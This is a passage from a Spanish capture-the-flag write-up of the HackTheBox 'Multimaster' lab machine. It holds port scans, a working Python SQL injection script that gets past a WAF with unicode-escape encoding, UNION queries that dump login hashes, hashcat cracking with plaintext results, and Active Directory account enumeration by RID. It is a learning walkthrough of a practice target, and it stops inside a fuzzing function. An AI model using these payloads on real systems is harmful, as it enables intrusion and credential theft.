---
title: "Hackthebox Multimaster Writeup (OSCP Style)"
date: 2020-09-19 13:01:08 +/-0800
categories: [Hackthebox,Windows]
tags: []
image: /assets/img/Post/Multimaster.jpg
---


Información de la máquina.

| Contenido | Descripción |                                                                                                                                        
|--|--|                                                                                                                                                            
| OS: | ![enter image description here](https://lh4.googleusercontent.com/MHW4d9kHrUo_W-GEyKNmxy4d80uPN5LB0VvwueRlflx-MIKT90EEwXBQZAv7Lg_N9dhTCed17DcmhNF-T_39FcYHrBAx7bHTDD1I7FGeqykdeKs849mRr1y0-aggvaZ7eYUYjPZG) |                                                                                                                                         
| Dificultad: | Insana |                                                                                                                                            
| Puntos: | 50 |                                                                                                                                                   
| Lanzamiento: | 07-Marzo-2020 |                                                                                                                                   
| IP: | 10.10.10.179|                                                                                                                                              
| Primera sangre de usuario: | [haqpl](https://www.hackthebox.eu/home/users/profile/76469) |                                                                     
| Primera sangre de system: | [snowscan](https://www.hackthebox.eu/home/users/profile/9267) |
| Creadores: | [MinatoTW](https://www.hackthebox.eu/home/users/profile/8308)  &  [egre55](https://www.hackthebox.eu/home/users/profile/1190) | 



# Reconocimiento.

Como siempre comenzaremos con un escaneo a los `65535` puertos para descubrir cuales son los puertos abiertos.

```console
intrusionz3r0@kali:~$ nmap -p- --open -T5 -n -oG nmapScanAllPorts multimaster.htb --min-rate 3000
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 23:39 CDT
Nmap scan report for multimaster.htb (10.10.10.179)
Host is up (0.17s latency).
Not shown: 65513 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49669/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49681/tcp open  unknown
49692/tcp open  unknown
49701/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 44.28 seconds
```

|Parámetro| Descripción |
|--|--|
| -p- | Escanea los 65535 puertos de la máquina. |
| --open | Muestra solo los puertos abiertos. |
| -T5 | Velocidad del escaneo muy agresiva. |
| -n | Desactivar la resolución de nombres DNS. |
| -oG | Exportar escaneo en formato grepeable. |
| --min-rate | Paquetes por segundo. |


Una vez identificado los puertos abiertos, lanzaré scripts de enumeración para detectar los servicios y versiones de los puertos descubiertos.

```console
intrusionz3r0@kali:~$ nmap -sCV -p53,80,88,135,139,389,445,464,636,3268,3269,3389,5985,9389,49674,49675,49681,49701,49748 -oN targeted multimaster.htb
Nmap scan report for multimaster.htb (10.10.10.179)
Host is up (0.73s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MegaCorp
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-08-15 19:52:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGACORP)
464/tcp   open  kpasswd5?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2020-08-14T16:51:23
|_Not valid after:  2021-02-13T16:51:23
|_ssl-date: 2020-08-15T19:56:43+00:00; +6m51s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49748/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=8/15%Time=5F383B76%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6m50s, deviation: 0s, median: 6m49s
| smb2-security-mode: 
|   2.10: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-08-15T19:55:38
|_  start_date: 2020-08-15T16:51:28

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 15 14:52:32 2020 -- 1 IP address (1 host up) scanned in 410.87 seconds
```

|Parámetro| Descripción |
|--|--|
| -sCV | Es la combinación de **-sC,-sV**, lanza scripts de enumeración básicos y detecta las versiones de los servicios.  |
| -p | Especifica los puertos a enumerar.  |
| -oN | Exporta el escaneo en formato nmap.  |


Se que son demasiados puertos pero no te preocupes, siempre que tengas demasiados puertos te recomiendo que comiences por los puertos más comunes, en este caso comenzaré por enumerar los servicios samba.

# Enumeración samba.

```console
intrusionz3r0@kali:~$ smbclient -L multimaster.htb -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

```console
intrusionz3r0@kali:~$ smbmap -H multimaster.htb -u "null"
[!] Authentication error on multimaster.htb
```
```
intrusionz3r0@kali:~$ enum4linux -U multimaster.htb -u "null" 
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Aug 18 23:46:06 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... multimaster.htb
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ======================================================= 
|    Enumerating Workgroup/Domain on multimaster.htb    |
 ======================================================= 
[E] Can't find workgroup/domain


 ======================================== 
|    Session Check on multimaster.htb    |
 ======================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server multimaster.htb allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 ============================================== 
|    Getting domain SID for multimaster.htb    |
 ============================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: MEGACORP
Domain Sid: S-1-5-21-3167813660-1240564177-918740779
[+] Host is part of a domain (not a workgroup)

 ================================ 
|    Users on multimaster.htb    |
 ================================ 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
enum4linux complete on Tue Aug 18 23:46:24 2020
```

```console
intrusionz3r0@kali:~$ cme smb multimaster.htb                               
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
```

Cosas que destacan en la enumeración samba:

* **OS:** Windows Server 2016 Standard 14393 x64 
*  **Dominio:** MEGACORP.LOCAL

No logramos sacar mucha información, así que vamos a por el servicio `http`.

# Enumeración HTTP.

Cuando entro al servicio `http` me encuentro con lo siguiente:

![](https://lh4.googleusercontent.com/s8JGkCMFtaVLt0ZcZCnYuICATH7e2EskWzKQtU7BXDVELTJs3Nj0_RibKVMwqgmgLbyrrACpY6X-lJjcmmgf_FI5QyaxbIsxYqmmzAws9VFrtfWPf5tmLoAKnsCKAziKHBrSMWNp)

Es una página web estática, no hay mucho que ver.

![](https://lh3.googleusercontent.com/ztcmQgG5AORdjeag6KMUugRcV16_y73DuXbrPfcWHWPCqJ9JxWsDoUpfGkcoc_ykeUjl1NbpdSFMRtIrAI09Vjhv3ZdLTGx_-51rtGYZi13qc3NLNEoU-dHYiGgJGKHmzdC6HWsS)

![](https://lh6.googleusercontent.com/oAJEIRvKiCr15LHEpuGBjMU8KcuWBtRNmWwPeFYSAyONbmQfd_S2T756TUiHwi_8uMsd8YB_I06vybIWdUC2sq8H8h489Szk1ytZ1CU7d11csRhx7iEL200y2zK5xhjqLeMRxTVD)Encontramos un login, pero cuando intento probar unas credenciales en este caso `admin:admin` me salta el siguiente mensaje:

![](https://lh6.googleusercontent.com/GfQ2scZKnSF8EkeV4lmDMMzUWKFu9pstKjCVNsV6sZ5n9fDo0CMP2AvXv-5mUd-_8C33L6G-jF1wD-vE0EsGufONDkaBkrmci0SLqPk6Qha2MOZjWVMIozfPQ5GgO51AIOBugQpl)

> **Consejo:** Siempre que te encuentres con un panel de login recomiendo que intentes probar contraseñas por defecto, inyecciones SQL y por último puedes realizar un ataque de fuerza bruta con diccionarios de SQLi para intentar lograr un bypass al login.

> **Consejo:** Recomiendo también mirar el código fuente, ya que en máquinas estilo CTF puedes encontrar cosas interesantes.

![](https://lh6.googleusercontent.com/hGRx3cbazyRDs9No88XNrdQdhRkGOGBBKwrpi2FNialysE7Vv8syasdLy6Kj_3d1XK50qxcwbGw_2jE03Urn5rCM-f5Qt5FaxL8YK-2JB6aCWypEjwt1igXJzB_G9zbDy2Yq2VyN)

Aprovecharé para comenzar a fuzzear la página web para ver si podemos encontrar algunas rutas.

```console
intrusionz3r0@kali:~$ wfuzz -c --hc 403,404 -t 200 -w /usr/share/wordlists/dirb/big.txt http://multimaster.htb/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://multimaster.htb/FUZZ
Total requests: 20469

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                 
===================================================================


Total time: 87.09734
Processed Requests: 20469
Filtered Requests: 20469
Requests/sec.: 235.0129
```

> **Consejo:**  Te recomiendo que siempre realices fuzzing a todo lo que encuentres ya sea que encuentres otra ruta siempre vuelve a hacer fuzzing hasta que ya no quede nada, también puedes agregar extensiones comunes de archivos, fuzzear subdominios, parámetros, parámetros con diccionarios de LFI, pero siempre siempre siempre has fuzzing hasta que ya no quede nada más.

# Descubriendo vulnerabilidad de SQL inyección.

Lo último que nos queda es la siguiente funcionalidad:

![](https://lh5.googleusercontent.com/z-L3wppLv7Bjz2V8A0_WHrepkXAhup_BIZginduFTTExIulGUIbHoZAQuoa6-sXyZ3eTz2d0NhVwokOR-ERPD1OS9a8GGysCzfDFujw43c2x2F53U8okJtyjW2ncFAtufIWUc5dY)

Parece ser que esto realiza una petición a una base de datos para poder obtener los nombres y mostrarlos.

![](https://lh3.googleusercontent.com/IL-CMDTYFXE9ZSzDnaiuhH-P5wV3hAH6IXem969Ax156vME3b8jRNh9X6ExJWJPLFODU9OKTgZM7PHrxV9nlLXWr1RJ15i0h0lUWVg7We793rEDfvrzsL8ldV6M-EHbSYz7aW_7k)

![](https://lh3.googleusercontent.com/IL-CMDTYFXE9ZSzDnaiuhH-P5wV3hAH6IXem969Ax156vME3b8jRNh9X6ExJWJPLFODU9OKTgZM7PHrxV9nlLXWr1RJ15i0h0lUWVg7We793rEDfvrzsL8ldV6M-EHbSYz7aW_7k)

Esto nos devuelve una gran cantidad de usuarios. 

Comenzaremos a testear está funcionalidad.
Cosas que intente:

* Revisar si era vulnerable a XSS.
* Causar un error de sintaxis de SQLi.
* Intentar probar si podía aprovecharme de esa función para poder obtener información interna del servidor.

Nada funcionaba, hasta que leí en el foro de `hackthebox` de que había que saltar un WAF. 

**¿Que es WAF?**

Un firewall de aplicaciones web es un tipo de firewall que supervisa, filtra o bloquea el tráfico HTTP hacia y desde una aplicación web. Se diferencia de un firewall normal en que puede filtrar el contenido de aplicaciones web específicas,

Esto me dio una pista, así que me puse a probar muchas formas de bypassear un waf hasta que di con la correcta.

La forma de lograr nuestro cometido era encodeando nuestra inyección en [unicode-escape](https://dencode.com/string/unicode-escape) 

![](https://lh5.googleusercontent.com/0rxBDlMfaQwx8FrFinkTEXxy7--VoyeQGlqBXXgT9b_nKgaFiMEiFMGKW3BIpu0sL2CiI3LGhJPvz1_Ls3RivEvRUskSJQk5yUI91Djc1rSA4C3ru-EcLXoEKJWpOo_8FlthjevV)

Intercepto la petición con burpsuite y cuando envió el payload recibimos una respuesta nula.

![](https://lh6.googleusercontent.com/28EuBzkNqU8SPfTuSCN_x2zDJCZNNMOn5VJsDfPMa7NHT3e6e1ldhxI7J7uFv49UtravghWlAAQ7cjBQR6g1SRvcbYL2XaEhr6ePEq2ZNexSU1QppSkqha9xjpjI_B-GcF1KQj06)

Esto nos da a entender que es vulnerable a SQL inyección, ahora debemos iterar en el numero de columnas hasta dar con la inyección correcta.

![](https://lh6.googleusercontent.com/ILu7ZHN5hsaCShTqSuDYsbQ99NXECgwPncSWQdcCPerOIYKvjrgHymlP7wLY0py-YXqJzVsAVHFPm79_FaBgWInn-wWaMOEou05LiVJdxo65P9zs4OEAkHtvwioy9d-ifV2jKINJ)

![](https://lh5.googleusercontent.com/t0kKelypqebwrXPtAhsC0AJzCHrdbykAOJsGqDbyT3MBYYl7-Hgu9i8Hy7UXlkzx65j9ZyuRqO54e2uDYj48GMxYfk_T2qpnqdz5wmm_nFOISb22zA-rfX9Qud5UOzt2EHxyEAKw)

Bien, al parecer hemos dado con la estructura correcta y ahora somos capaces de poder extraer información de la base de datos.

Para hacerlo mas divertido vamos a construirnos una utilidad en python.

# Creación de Script para SQL Inyección.


Importamos las librerías a utilizar y  la cabecera.
```python
#!/usr/bin/env python3
#Author: Intrusionz3r0

import requests,sys,signal,json
```
Utilizamos la librería `signal` para manejar la salida del programa.

```python
def handler(key,frame):
	print("Adios!!")
	sys.exit(0)

signal = signal.signal(signal.SIGINT,handler)
```
Definimos el método que se encargará de decodificar nuestra inyección. 

```python
def encodeText(texto): 
	textoF = [] #Creamos una lista.

	for x in texto:
		char = hex(ord(x)) #Cada carácter lo convierte en hexadecimal.
		char = char.replace("0x","\\u00") #Remplazamos el 0x con \\u00.
		textoF.append(char) #Lo agregamos a la lista textoF[]

	textoF = "".join(textoF) #Unimos toda la lista en una sola cadena de texto.
	return textoF #Retornamos la cadena.
```
Definimos el método para enviar la inyección.
```python
def sqli(inyeccion):

	url = 'http://multimaster.htb/api/getColleagues' #Definimos la url.
	headers = {'Content-Type': 'application/json; charset=utf-8'} #Definimos el header.
	r1 = requests.post(url, data = '{"name":"'+str(inyeccion)+'"}', headers=headers) #Hacemos la petición.
	parsed = json.loads(r1.text) #Cargamos el JSON.
	return (json.dumps(parsed, indent=4, sort_keys=True)) #Devolvemos el JSON con su estructura original
```

Por ultimo solo creamos nuestro método `main`.

```python
if __name__ == "__main__":

	while True: #Bucle Infinito.
		inyeccion = input('intrusionz3r0@kali:~$ ') #Leemos por consola.
		print(sqli(encodeText(inyeccion))) #Imprimimos la salida.
```

**Script completo:**
```python
#!/usr/bin/env python3
#Author: Intrusionz3r0

import requests,sys,signal,json


def handler(key,frame):
	print("Adios!!")
	sys.exit(0)

signal = signal.signal(signal.SIGINT,handler)


def encodeText(texto): 
	textoF = []

	for x in texto:
		char = hex(ord(x))
		char = char.replace("0x","\\u00")
		textoF.append(char)

	textoF = "".join(textoF)
	return textoF

def sqli(inyeccion):

	url = 'http://multimaster.htb/api/getColleagues'
	headers = {'Content-Type': 'application/json; charset=utf-8'}
	r1 = requests.post(url, data = '{"name":"'+str(inyeccion)+'"}', headers=headers)
	parsed = json.loads(r1.text)
	return (json.dumps(parsed, indent=4, sort_keys=True))


if __name__ == "__main__":

	while True:
		inyeccion = input('intrusionz3r0@kali:~$ ')
		print(sqli(encodeText(inyeccion)))

```

![](https://lh6.googleusercontent.com/-d3hjSjdOAp1q4EN1w3ob9VsBMzjZ2G9SprS1NDR4InklTavkvdKEZLQlOnUpzAErR9NNb7-yrw2ylcs86zyk_qKxDvgzMLt9dyHLxEyyfCziO79xyBJyiTBU4hdiJahOFsvNe_q)


![enter image description here](https://ep01.epimg.net/verne/imagenes/2015/03/13/articulo/1426256880_636614_1426262301_miniatura_normal.gif)

Ahora si podemos enumerar la base de datos mas cómodamente.

# Enumeración de la base de datos.



```console
intrusionz3r0@kali:~$ a'union select 1,schema_name,3,4,5 from information_schema.schemata-- -
[
    {
        "email": "4",
        "id": 1,
        "name": "db_accessadmin",
        "position": "3",
        "src": "5"
    },
    {
        "email": "4",
        "id": 1,
        "name": "db_backupoperator",
        "position": "3",
        "src": "5"
    },
    {
        "email": "4",
        "id": 1,
        "name": "db_datareader",
        "position": "3",
        "src": "5"
    },
    {
        "email": "4",
        "id": 1,
        "name": "db_datawriter",
        "position": "3",
        "src": "5"
    },
    {
        "email": "4",
        "id": 1,
        "name": "db_ddladmin",
        "position": "3",
        "src": "5"
    },
    {
        "email": "4",
        "id": 1,
        "name": "db_denydatareader",
        "position": "3",
        "src": "5"
    },
    {
        "email": "4",
        "id": 1,
        "name": "db_denydatawriter",
        "position": "3",
        "src": "5"
    },
    {
        "email": "4",
        "id": 1,
        "name": "db_owner",
        "position": "3",
        "src": "5"
    },
    {
        "email": "4",
        "id": 1,
        "name": "db_securityadmin",
        "position": "3",
        "src": "5"
    },
    {
        "email": "4",
        "id": 1,
        "name": "dbo",
        "position": "3",
        "src": "5"
    },
    {
        "email": "4",
        "id": 1,
        "name": "guest",
        "position": "3",
        "src": "5"
    },
    {
        "email": "4",
        "id": 1,
        "name": "INFORMATION_SCHEMA",
        "position": "3",
        "src": "5"
    },
    {
        "email": "4",
        "id": 1,
        "name": "sys",
        "position": "3",
        "src": "5"
    }
]
```
Yo iré al grano, me iré rápidamente a la base de datos que contiene información valiosa.

```console
intrusionz3r0@kali:~$ a'union select 1,table_name,3,4,5 from information_schema.tables where table_schema='dbo'-- -
[
    {
        "email": "4",
        "id": 1,
        "name": "Colleagues",
        "position": "3",
        "src": "5"
    },
    {
        "email": "4",
        "id": 1,
        "name": "Logins",
        "position": "3",
        "src": "5"
    }
]
intrusionz3r0@kali:~$ a'union select 1,column_name,3,4,5 from information_schema.columns where table_name='Logins'-- -
[
    {
        "email": "4",
        "id": 1,
        "name": "id",
        "position": "3",
        "src": "5"
    },
    {
        "email": "4",
        "id": 1,
        "name": "password",
        "position": "3",
        "src": "5"
    },
    {
        "email": "4",
        "id": 1,
        "name": "username",
        "position": "3",
        "src": "5"
    }
]
```
Vamos dumpear la información.
```console
intrusionz3r0@kali:~$ a'union select 1,id,username,password,5 from Logins-- -
[
    {
        "email": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
        "id": 1,
        "name": "1",
        "position": "sbauer",
        "src": "5"
    },
    {
        "email": "fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa",
        "id": 1,
        "name": "2",
        "position": "okent",
        "src": "5"
    },
    {
        "email": "68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813",
        "id": 1,
        "name": "3",
        "position": "ckane",
        "src": "5"
    },
    {
        "email": "68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813",
        "id": 1,
        "name": "4",
        "position": "kpage",
        "src": "5"
    },
    {
        "email": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
        "id": 1,
        "name": "5",
        "position": "shayna",
        "src": "5"
    },
    {
        "email": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
        "id": 1,
        "name": "6",
        "position": "james",
        "src": "5"
    },
    {
        "email": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
        "id": 1,
        "name": "7",
        "position": "cyork",
        "src": "5"
    },
    {
        "email": "fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa",
        "id": 1,
        "name": "8",
        "position": "rmartin",
        "src": "5"
    },
    {
        "email": "68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813",
        "id": 1,
        "name": "9",
        "position": "zac",
        "src": "5"
    },
    {
        "email": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
        "id": 1,
        "name": "10",
        "position": "jorden",
        "src": "5"
    },
    {
        "email": "fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa",
        "id": 1,
        "name": "11",
        "position": "alyx",
        "src": "5"
    },
    {
        "email": "68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813",
        "id": 1,
        "name": "12",
        "position": "ilee",
        "src": "5"
    },
    {
        "email": "fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa",
        "id": 1,
        "name": "13",
        "position": "nbourne",
        "src": "5"
    },
    {
        "email": "68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813",
        "id": 1,
        "name": "14",
        "position": "zpowers",
        "src": "5"
    },
    {
        "email": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
        "id": 1,
        "name": "15",
        "position": "aldom",
        "src": "5"
    },
    {
        "email": "cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc",
        "id": 1,
        "name": "16",
        "position": "minatotw",
        "src": "5"
    },
    {
        "email": "cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc",
        "id": 1,
        "name": "17",
        "position": "egre55",
        "src": "5"
    }
]
```
# Crackeando los hashes.
Rápidamente creo una lista con los hashes y usuarios que acabamos de descubrir.

![](https://lh4.googleusercontent.com/y8XbsIoYhNOzQVwpOsH0OawWUPFrCG6n1LXTO1otnDopfmfvjUieHFEDXfv5ZV4v8uwUN3G3P2b1A-F3__HTJpzHHmLIYCsu7ytuHxhRE1GhneQNjSB7fSvUSnyacv8QJ4GPhL-3)

![](https://lh6.googleusercontent.com/qIKkjnsbyG5BsdcH3gA5L8t4LFwJ62KLrh1ub5aalIe-4tAm4X5H2ATt3VuYUCugbqdiMRzk5lsLWAkoe5Es3Vw17ARacplPaaD7ZLgnmDwa8biVgoACEQFERKFFMTYCaELTJ99B)

Copio un hash y lo pego en la herramienta `hash-identifier`.

![](https://lh6.googleusercontent.com/qMgaz6Sa8eVqw7ACb3j0wIXJo5rQ7Gpoa1z78_ElYaCz54iRQMSnH9oTsZTNXnme3G0RHy88P_aXqAvCrTrSfTQiCPKMukOUtWIqRQYKD7jnJYm339tdRhFTYkOXIFYliEtibpu5)

Realizo un búsqueda de los cifrados disponibles en hashcat y comienzo a probar.

```console
intrusionz3r0@kali:~$ hashcat -h | grep 384
  10800 | SHA2-384                                         | Raw Hash
  17500 | SHA3-384                                         | Raw Hash
  17900 | Keccak-384                                       | Raw Hash
```

```console
intrusionz3r0@kali:~$ sudo hashcat -m 17500 passwords.txt /usr/share/wordlists/rockyou.txt --outfile cred.txt --force
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
```

**¡¡Eureka!!**

Ahora que tenemos unas contraseñas podemos realizar un ataque de fuerza bruta utilizando [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) para poder ver si damos con unas credenciales validas.

![](https://lh4.googleusercontent.com/WoFlPbLTaQxWbqGRxGbM3x1Kjk2q2duTG3seWycrmovf8vq6KzwE74850A7Yh8KfnLV6beOl6QmpJMurmmOJZt3pVGRjTwB7dbgF2qlyOaYkJaIPQBaCnmRnNFG3SuRNsvsdWjdF)

**¡¡Mierda!!**  


No hemos dado con ningunas credenciales.

![enter image description here](https://i.ytimg.com/vi/FI7u4Bk472c/maxresdefault.jpg)

# Enumeración del controlador de dominio vía SQL inyección.


Después de un tiempo encontré el siguiente artículo: [Hacking SQL Server: Enumerating Domain Accounts](https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/). En resumen nosotros podemos enumerar las cuentas de un dominio de active directory realizando fuzzing al identificador RID.

**¿Que es el RID?**

El RID es un identificador único e incremental que se le asigna a un objeto en un directorio activo, por lo que cada uno de los usuarios de dominio, grupos y equipos tienen un identificador propio.

Comenzaremos obteniendo el nombre de  dominio. (Aunque ya lo sabemos es por cuestiones de aprendizaje)
```console
intrusionz3r0@kali:~$ a' union select 1,(SELECT DEFAULT_DOMAIN()),3,4,5-- -
[
    {
        "email": "4",
        "id": 1,
        "name": "MEGACORP",
        "position": "3",
        "src": "5"
    }
]
```
Luego tendremos que colocar una cuenta de prueba, en este caso `Domain Admins` ya que es una cuenta muy común y sabemos sin dudar que existe. 
```console
intrusionz3r0@kali:~$ a' union select 1,(SELECT SUSER_SID('MEGACORP\Domain Admins')),3,4,5-- -
[
    {
        "email": "4",
        "id": 1,
        "name": "\u0001\u0005\u0000\u0000\u0000\u0000\u0000\u0005\u0015\u0000\u0000\u0000\u001c\u0000\u00d1\u00bc\u00d1\u0081\u00f1I+\u00df\u00c26\u0000\u0002\u0000\u0000",
        "position": "3",
        "src": "5"
    }
]
```
Esto debería arrojarnos el `RID` pero lamentablemente nos lo devuelve codificado, pero no te preocupes podemos utilizar la función `sys.fn_varbintohexstr` de SQL Server para decodificar esto.
```console
intrusionz3r0@kali:~$ a' union select 1,sys.fn_varbintohexstr((SELECT SUSER_SID('MEGACORP\Domain Admins'))),3,4,5-- -
[
    {
        "email": "4",
        "id": 1,
        "name": "0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000",
        "position": "3",
        "src": "5"
    }
]
```
Después utilizamos la función `UPPER` para convertir la consulta en mayúsculas.
```console
intrusionz3r0@kali:~$ a' union select 1,UPPER(sys.fn_varbintohexstr((SELECT SUSER_SID('MEGACORP\Domain Admins')))),3,4,5-- -
[
    {
        "email": "4",
        "id": 1,
        "name": "0X0105000000000005150000001C00D1BCD181F1492BDFC23600020000",
        "position": "3",
        "src": "5"
    }
]
```
Ahora que tenemos el RID podemos extraer el SID del dominio tomando los primeros 48 bytes. 

**¿Que es SID?**

El SID de dominio es el identificador único del dominio y la base de cada RID completo.

* SID + RID: 0X0105000000000005150000001C00D1BCD181F1492BDFC23600020000

* SID: **0X0105000000000005150000001C00D1BCD181F1492BDFC236** 00020000

* RID: 0X0105000000000005150000001C00D1BCD181F1492BDFC236 **00020000**

Nuestro trabajo será fuzzear en los 8 últimos bytes para poder enumerar las cuentas del directorio activo, pero no sera tan facil ya que cada numero debe estar en hexadecimal y debe ser convertido en un formato que SQL Server sea capaz de interpretar.

**Por ejemplo:**

Número: 500

Hex: 0x1F4

Paso 1:  **01F4** (500)

Paso 2:  **F401** (Formato correcto) (Invertido) 

Paso 3:  **F4010000** (Colocamos el relleno para completar los bytes)

Paso 4: Lo concatenamos con el SID base.

Pero la pregunta es: ¿Después de obtener todos los RID de las cuentas de dominio que sigue?

Pues utilizar la función `SUSER_SNAME` para obtener el nombre identificativo.

```console
intrusionz3r0@kali:~$ a' union select 1,(SELECT SUSER_SNAME(0X0105000000000005150000001C00D1BCD181F1492BDFC23600020000)),3,4,5-- -
[
    {
        "email": "4",
        "id": 1,
        "name": "MEGACORP\\Domain Admins",
        "position": "3",
        "src": "5"
    }
]
```
Asi lograremos obtener una gran lista de muchas cuentas del Active directory.


Para lograr esto vamos a actualizar nuestra herramienta.

# Actualizando el script.


Creamos una variable global que almacene el SID del dominio e importamos la librería `re` y `pwn`.

```python
import re
from pwn import  *
SID = "0X0105000000000005150000001C00D1BCD181F1492BDFC236"
```

Definimos el método que se encargará de fuzzear. 
```python
def fuzzing(num):

	array=[] #Creamos una lista.
	hexn = hex(num) #Convertimos el numero en hexadecimal.
	hexn = hexn.replace("x","") #Eliminamos el carácter X.
	for char in str(hexn): #Recorremos cada dígito del número.
		array.append(char) #Cada dígito lo guardamos en la lista.

	ID = str(array[2]+array[3]+array[0]+array[1]) #Invertimos el numero y lo convertimos en un formato entendible para SQL Server.
